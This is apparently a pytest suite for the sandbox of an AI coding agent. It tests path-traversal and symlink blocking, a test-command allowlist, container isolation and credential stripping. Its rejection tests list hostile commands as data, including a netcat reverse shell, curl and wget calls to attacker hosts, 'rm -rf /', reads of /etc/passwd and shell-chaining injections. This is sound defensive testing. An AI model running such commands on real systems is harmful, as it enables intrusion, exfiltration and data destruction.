import os
import subprocess
import tempfile
import time
from pathlib import Path
from unittest.mock import patch, MagicMock
import pytest

from app.agent.tools import (
    WorkspaceTools,
    resolve_safe_workspace_path,
    sanitize_subprocess_env,
    check_container_runtime,
    compute_unified_diff,
    MAX_FILE_SIZE_BYTES,
    MAX_OUTPUT_BYTES,
    PERMITTED_TEST_PREFIXES,
    DISALLOWED_SHELL_PATTERNS,
)
from app.services.task_runner import TaskRunner
from app.services.github_service import GitHubService


# ==============================================================================
# 1. STRICT PATH CONTAINMENT & TRAVERSAL PREVENTION TESTS
# ==============================================================================

def test_path_traversal_relative_rejected(tmp_path):
    """Verify strict rejection of parent directory traversal ('..') across all operations."""
    tools = WorkspaceTools(base_dir=str(tmp_path))
    (tmp_path / "valid.py").write_text("print('hello')", encoding="utf-8")

    traversal_paths = [
        "../secrets.txt",
        "../../etc/passwd",
        "sub/../../escape.py",
        "nested/sub/../../../shadow",
        "..",
        "../",
    ]

    for bad_path in traversal_paths:
        # Read
        with pytest.raises(ValueError) as exc:
            tools.read_file(bad_path)
        assert "prohibited" in str(exc.value).lower() or "traversal" in str(exc.value).lower()

        # Write
        with pytest.raises(ValueError) as exc:
            tools.write_file(bad_path, "malicious_content")
        assert "prohibited" in str(exc.value).lower() or "traversal" in str(exc.value).lower()

        # Delete
        with pytest.raises(ValueError) as exc:
            tools.delete_file(bad_path)
        assert "prohibited" in str(exc.value).lower() or "traversal" in str(exc.value).lower()

        # Patch
        with pytest.raises(ValueError) as exc:
            tools.apply_patch(bad_path, "replacement")
        assert "prohibited" in str(exc.value).lower() or "traversal" in str(exc.value).lower()


def test_path_traversal_absolute_paths_rejected(tmp_path):
    """Verify strict rejection of absolute POSIX, Windows, and UNC paths."""
    tools = WorkspaceTools(base_dir=str(tmp_path))

    absolute_paths = [
        "/etc/passwd",
        "/var/log/syslog",
        "/tmp/malicious.sh",
        "C:\\Windows\\System32\\cmd.exe",
        "C:/secret.env",
        "D:\\data\\passwords.txt",
        "\\\\network_share\\file",
    ]

    for abs_path in absolute_paths:
        with pytest.raises(ValueError) as exc_read:
            tools.read_file(abs_path)
        assert "absolute paths are strictly prohibited" in str(exc_read.value).lower()

        with pytest.raises(ValueError) as exc_write:
            tools.write_file(abs_path, "exploit")
        assert "absolute paths are strictly prohibited" in str(exc_write.value).lower()

        with pytest.raises(ValueError) as exc_del:
            tools.delete_file(abs_path)
        assert "absolute paths are strictly prohibited" in str(exc_del.value).lower()

        with pytest.raises(ValueError) as exc_patch:
            tools.apply_patch(abs_path, "exploit")
        assert "absolute paths are strictly prohibited" in str(exc_patch.value).lower()


def test_path_illegal_control_characters_rejected(tmp_path):
    """Verify paths containing null bytes or newlines are rejected."""
    tools = WorkspaceTools(base_dir=str(tmp_path))

    illegal_paths = [
        "file\x00.txt",
        "nested/file\r.py",
        "sub/file\n.py",
    ]

    for bad_path in illegal_paths:
        with pytest.raises(ValueError) as exc:
            tools.read_file(bad_path)
        assert "illegal control characters" in str(exc.value).lower()


def test_path_containment_in_virtual_workspace():
    """Verify virtual in-memory workspace enforces identical containment checks."""
    tools = WorkspaceTools(virtual_files={"app/main.py": "print(1)"})

    # Legitimate read
    assert tools.read_file("app/main.py") == "print(1)"

    # Relative escape
    with pytest.raises(ValueError) as exc1:
        tools.read_file("../secret.txt")
    assert "prohibited" in str(exc1.value).lower() or "containment" in str(exc1.value).lower()

    # Absolute path escape
    with pytest.raises(ValueError) as exc2:
        tools.write_file("/etc/shadow", "test")
    assert "absolute paths are strictly prohibited" in str(exc2.value).lower()


def test_symlink_escape_detection_on_read(tmp_path):
    """Verify symlinks pointing outside the workspace boundary are caught and rejected on read."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    outside_file = outside_dir / "secret.env"
    outside_file.write_text("SUPER_SECRET_KEY=12345", encoding="utf-8")

    link_path = workspace / "symlink_secret.txt"

    # Try creating symlink; if non-admin Windows raises OSError, mock os.path.realpath
    can_symlink = False
    try:
        os.symlink(str(outside_file), str(link_path))
        can_symlink = True
    except (OSError, NotImplementedError):
        pass

    tools = WorkspaceTools(base_dir=str(workspace))

    if can_symlink:
        with pytest.raises(ValueError) as exc:
            tools.read_file("symlink_secret.txt")
        assert "symlink escape detected" in str(exc.value).lower()
    else:
        # Cross-platform simulation via mock
        with patch("app.agent.tools.os.path.realpath") as mock_realpath, \
             patch("app.agent.tools.os.path.exists", return_value=True), \
             patch("app.agent.tools.os.path.isfile", return_value=True):
            # Base realpath is inside workspace, target realpath is outside
            mock_realpath.side_effect = lambda p: str(outside_file) if str(p).endswith("symlink_secret.txt") else str(workspace)
            with pytest.raises(ValueError) as exc:
                resolve_safe_workspace_path(str(workspace), "symlink_secret.txt", must_exist=True)
            assert "symlink escape detected" in str(exc.value).lower()


def test_symlink_escape_detection_on_write_and_parent(tmp_path):
    """Verify writing through symlinks or parent symlink directories pointing outside workspace is rejected."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()

    # Simulate parent directory being a symlink to outside
    with patch("app.agent.tools.os.path.realpath") as mock_realpath, \
         patch("app.agent.tools.os.path.exists", side_effect=lambda p: False if str(p).endswith("file.txt") else True):
        mock_realpath.side_effect = lambda p: str(outside_dir) if "sym_dir" in Path(p).parts else str(workspace)
        with pytest.raises(ValueError) as exc:
            resolve_safe_workspace_path(str(workspace), "sym_dir/file.txt", must_exist=False)
        assert "symlink" in str(exc.value).lower()


# ==============================================================================
# 2. ALLOWLISTED TEST RUNNERS & SHELL INJECTION PREVENTION TESTS
# ==============================================================================

def test_all_permitted_test_runners_accepted():
    """Verify every permitted test runner prefix is accepted by the parser."""
    tools = WorkspaceTools(
        test_runner_fn=lambda cmd: {"exit_code": 0, "passed": True, "stdout": "All tests passed", "stderr": ""}
    )

    test_commands = [
        "pytest",
        "pytest -v tests/",
        "python -m pytest tests/test_unit.py",
        "python -m unittest discover",
        "npm test",
        "npm run test",
        "yarn test",
        "pnpm test",
        "cargo test",
        "go test ./...",
    ]

    for cmd in test_commands:
        result = tools.run_tests(cmd)
        assert result["passed"] is True
        assert result["exit_code"] == 0
        assert result["command"] == cmd
        assert result["isolated"] is True


def test_disallowed_shell_commands_strictly_rejected():
    """Verify arbitrary system commands and utilities are rejected."""
    tools = WorkspaceTools()

    disallowed = [
        "whoami",
        "cat /etc/passwd",
        "curl -X POST https://attacker.com",
        "wget https://malware.com/payload.sh",
        "bash -c 'id'",
        "sh -c 'echo owned'",
        "powershell Get-Process",
        "cmd.exe /c dir",
        "rm -rf /",
        "chmod 777 file",
        "chown root file",
        "sudo rm -rf /",
        "nc -e /bin/sh 10.0.0.1 4444",
    ]

    for cmd in disallowed:
        with pytest.raises(ValueError) as exc:
            tools.run_tests(cmd)
        err = str(exc.value).lower()
        assert "prohibited" in err or "allowlist" in err or "whitelist" in err or "unsafe" in err


def test_shell_chaining_and_metacharacters_rejected():
    """Verify command chaining operators, pipes, redirects, subshells, and backticks are rejected."""
    tools = WorkspaceTools()

    chained_commands = [
        "pytest; rm -rf /",
        "pytest && curl evil.com",
        "pytest || echo fallback",
        "pytest | grep failure",
        "pytest > output.txt",
        "pytest < input.txt",
        "pytest $(cat token.txt)",
        "pytest `cat token.txt`",
        "pytest\nwhoami",
        "pytest\rwhoami",
    ]

    for cmd in chained_commands:
        with pytest.raises(ValueError) as exc:
            tools.run_tests(cmd)
        err = str(exc.value).lower()
        assert "prohibited" in err or "operator" in err or "unsafe" in err or "allowlist" in err


def test_empty_and_whitespace_command_rejected():
    """Verify empty or whitespace-only test commands raise ValueError."""
    tools = WorkspaceTools()
    for empty in ["", "   ", "\t\n"]:
        with pytest.raises(ValueError) as exc:
            tools.run_tests(empty)
        assert "empty" in str(exc.value).lower()


# ==============================================================================
# 3. DISPOSABLE CONTAINER ISOLATION & HOST EXECUTION REFUSAL TESTS
# ==============================================================================

def test_refuse_host_execution_when_container_runtime_unavailable():
    """
    CRITICAL SECURITY INVARIANT:
    Never execute untrusted repository code on the host without container isolation.
    When Docker and Podman are unavailable, refuse execution with exit code 126.
    """
    tools = WorkspaceTools(base_dir="c:/some/workspace")

    with patch("app.agent.tools.check_container_runtime", return_value=(False, "none")):
        result = tools.run_tests("pytest")

        assert result["exit_code"] == 126
        assert result["passed"] is False
        assert result["isolated"] is False
        assert result["runtime"] == "none"
        assert "Execution Refused" in result["stderr"]
        assert "No safe container runtime" in result["stderr"]
        assert "directly on the host" in result["stderr"]


def test_container_execution_command_and_resource_limits(tmp_path):
    """
    Verify that when container runtime is available, commands run inside disposable
    containers with explicit resource, filesystem, network, and memory boundaries.
    """
    tools = WorkspaceTools(base_dir=str(tmp_path))

    with patch("app.agent.tools.check_container_runtime", return_value=(True, "docker")), \
         patch("subprocess.run") as mock_subproc:

        mock_subproc.return_value = subprocess.CompletedProcess(
            args=["docker"],
            returncode=0,
            stdout="3 passed in 0.24s",
            stderr="",
        )

        result = tools.run_tests("pytest -v tests/")

        assert result["exit_code"] == 0
        assert result["passed"] is True
        assert result["isolated"] is True
        assert result["runtime"] == "docker"

        # Inspect docker invocation flags
        call_args = mock_subproc.call_args[0][0]
        assert call_args[0] == "docker"
        assert call_args[1] == "run"
        assert "--rm" in call_args
        assert "--network" in call_args and call_args[call_args.index("--network") + 1] == "none"
        assert "--memory" in call_args and call_args[call_args.index("--memory") + 1] == "512m"
        assert "--cpus" in call_args and call_args[call_args.index("--cpus") + 1] == "1.0"
        assert "-w" in call_args and call_args[call_args.index("-w") + 1] == "/workspace"
        assert "pytest" in call_args
        assert "-v" in call_args
        assert "tests/" in call_args


# ==============================================================================
# 4. EXECUTION METRICS, TIMEOUTS, OUTPUT LIMITS & TRUNCATION TESTS
# ==============================================================================

def test_metrics_captured_accurately():
    """Verify command, stdout, stderr, exit code, and duration are captured."""
    def dummy_runner(cmd):
        time.sleep(0.01)
        return {"exit_code": 0, "passed": True, "stdout": "Test passed", "stderr": ""}

    tools = WorkspaceTools(test_runner_fn=dummy_runner)
    result = tools.run_tests("pytest")

    assert result["command"] == "pytest"
    assert result["exit_code"] == 0
    assert result["passed"] is True
    assert result["stdout"] == "Test passed"
    assert result["stderr"] == ""
    assert isinstance(result["duration_seconds"], float)
    assert result["duration_seconds"] >= 0.01


def test_command_timeout_returns_124():
    """Verify execution timeout returns exit code 124 and clear stderr message."""
    def timing_out_runner(cmd):
        raise subprocess.TimeoutExpired(cmd=cmd, timeout=5)

    tools = WorkspaceTools(test_runner_fn=timing_out_runner)
    result = tools.run_tests("pytest", timeout=5)

    assert result["exit_code"] == 124
    assert result["passed"] is False
    assert "timed out" in result["stderr"].lower()
    assert isinstance(result["duration_seconds"], float)


def test_command_failure_captured():
    """Verify test assertion failure captures exit code 1 and error trace."""
    def failing_runner(cmd):
        return {
            "exit_code": 1,
            "passed": False,
            "stdout": "FAILED test_auth.py::test_login",
            "stderr": "AssertionError: expected 200, got 401",
        }

    tools = WorkspaceTools(test_runner_fn=failing_runner)
    result = tools.run_tests("pytest")

    assert result["exit_code"] == 1
    assert result["passed"] is False
    assert "FAILED" in result["stdout"]
    assert "AssertionError" in result["stderr"]


def test_file_size_limits_enforced(tmp_path):
    """Verify read and write reject files exceeding MAX_FILE_SIZE_BYTES (2MB)."""
    tools = WorkspaceTools(base_dir=str(tmp_path))

    # Writing oversized content
    oversized_content = "X" * (MAX_FILE_SIZE_BYTES + 1024)
    with pytest.raises(ValueError) as exc_write:
        tools.write_file("large_file.txt", oversized_content)
    assert "exceeds maximum permitted file size" in str(exc_write.value)

    # Reading oversized file already on disk
    oversized_file = tmp_path / "large_on_disk.txt"
    oversized_file.write_bytes(b"A" * (MAX_FILE_SIZE_BYTES + 1024))

    with pytest.raises(ValueError) as exc_read:
        tools.read_file("large_on_disk.txt")
    assert "exceeds maximum permitted size" in str(exc_read.value)


def test_output_size_truncation_enforced():
    """Verify test output exceeding MAX_OUTPUT_BYTES (50KB) is cleanly truncated."""
    oversized_output = "Line of output\n" * 4000  # > 50KB

    tools = WorkspaceTools(
        test_runner_fn=lambda cmd: {
            "exit_code": 0,
            "passed": True,
            "stdout": oversized_output,
            "stderr": oversized_output,
        }
    )

    result = tools.run_tests("pytest")
    assert len(result["stdout"].encode("utf-8")) <= MAX_OUTPUT_BYTES + 200
    assert "[Output truncated: exceeded size limit]" in result["stdout"]
    assert len(result["stderr"].encode("utf-8")) <= MAX_OUTPUT_BYTES + 200
    assert "[Output truncated: exceeded size limit]" in result["stderr"]


# ==============================================================================
# 5. CREDENTIAL ISOLATION & GIT SECURITY TESTS
# ==============================================================================

def test_sanitize_subprocess_env_strips_sensitive_credentials():
    """Verify sanitize_subprocess_env strips tokens, keys, secrets, and sets GIT_TERMINAL_PROMPT=0."""
    dirty_env = {
        "PATH": "/usr/bin:/bin",
        "GITHUB_TOKEN": os.getenv("TEST_GITHUB_TOKEN", "fake-test-token-value"),
        "GROQ_API_KEY": os.getenv("TEST_GROQ_KEY", "fake-test-key-value"),
        "DATABASE_URL": "postgresql://postgres:fake-test-pass@localhost:5432/db",
        "AWS_SECRET_ACCESS_KEY": "fake-aws-secret-access-key",
        "APP_PASSWORD": "fake-app-password",
        "SAFE_VAR": "harmless_value",
    }

    clean_env = sanitize_subprocess_env(dirty_env)

    assert "GITHUB_TOKEN" not in clean_env
    assert "GROQ_API_KEY" not in clean_env
    assert "DATABASE_URL" not in clean_env
    assert "AWS_SECRET_ACCESS_KEY" not in clean_env
    assert "APP_PASSWORD" not in clean_env
    assert clean_env.get("SAFE_VAR") == "harmless_value"
    assert clean_env.get("PATH") == "/usr/bin:/bin"
    assert clean_env.get("GIT_TERMINAL_PROMPT") == "0"


def test_task_runner_isolated_workspace_and_branch(tmp_path):
    """
    Verify TaskRunner creates isolated workspace under workspaces/{task_id},
    validates GitHub repository, and sets task-specific working branch.
    """
    mock_gh = MagicMock(spec=GitHubService)
    mock_gh.token = os.getenv("TEST_GITHUB_TOKEN", "fake-mock-token-sample")

    runner = TaskRunner(github_service=mock_gh)
    task_id = 999
    repo_url = "https://github.com/octocat/Hello-World"

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = subprocess.CompletedProcess(args=["git"], returncode=0, stdout="", stderr="")

        tools = runner.setup_task_workspace(
            task_id=task_id,
            repository_url=repo_url,
            workspaces_dir=tmp_path,
        )

        expected_dir = (tmp_path / str(task_id)).resolve()
        assert Path(tools.base_dir).resolve() == expected_dir
        assert expected_dir.exists()

        # Check git clone was called with in-memory header, not credentials in url
        calls = mock_run.call_args_list
        clone_call = calls[0][0][0]
        assert clone_call[0] == "git"
        assert clone_call[1] == "clone"
        assert "-c" in clone_call
        assert any("http.extraheader=AUTHORIZATION:" in arg for arg in clone_call)
        # Verify token is NOT embedded in URL
        assert not any("fake-mock-token-sample" in arg and "github.com" in arg for arg in clone_call)


def test_setup_task_workspace_rejects_unvalidated_urls(tmp_path):
    """Verify setup_task_workspace refuses non-GitHub or invalid URLs."""
    runner = TaskRunner()

    invalid_urls = [
        "ftp://github.com/owner/repo",
        "http://attacker.com/malicious/repo",
        "file:///etc/passwd",
        "https://notgithub.org/owner/repo",
    ]

    for bad_url in invalid_urls:
        with pytest.raises(Exception):
            runner.setup_task_workspace(task_id=1, repository_url=bad_url, workspaces_dir=tmp_path)


# ==============================================================================
# 6. PATCH REVIEWABILITY & GIT DIFF RECORDING TESTS
# ==============================================================================

def test_apply_patch_records_reviewable_unified_diff(tmp_path):
    """Verify apply_patch modifies file and captures accurate unified diff."""
    tools = WorkspaceTools(base_dir=str(tmp_path))
    (tmp_path / "calc.py").write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")

    new_code = "def add(a, b):\n    return a + b\n"
    patch_result = tools.apply_patch("calc.py", new_code)

    assert patch_result["changed"] is True
    assert patch_result["file_path"] == "calc.py"
    assert "--- a/calc.py" in patch_result["diff_text"]
    assert "+++ b/calc.py" in patch_result["diff_text"]
    assert "-    return a - b" in patch_result["diff_text"]
    assert "+    return a + b" in patch_result["diff_text"]

    # Verify disk content was updated
    assert tools.read_file("calc.py") == new_code


def test_get_diff_tracks_workspace_modifications(tmp_path):
    """Verify get_diff returns combined reviewable diffs for all modified files."""
    tools = WorkspaceTools(base_dir=str(tmp_path))
    (tmp_path / "foo.py").write_text("orig_foo = 1\n", encoding="utf-8")
    (tmp_path / "bar.py").write_text("orig_bar = 2\n", encoding="utf-8")

    tools.apply_patch("foo.py", "new_foo = 10\n")
    tools.apply_patch("bar.py", "new_bar = 20\n")

    full_diff = tools.get_diff()
    assert "foo.py" in full_diff
    assert "bar.py" in full_diff
    assert "+new_foo = 10" in full_diff
    assert "+new_bar = 20" in full_diff
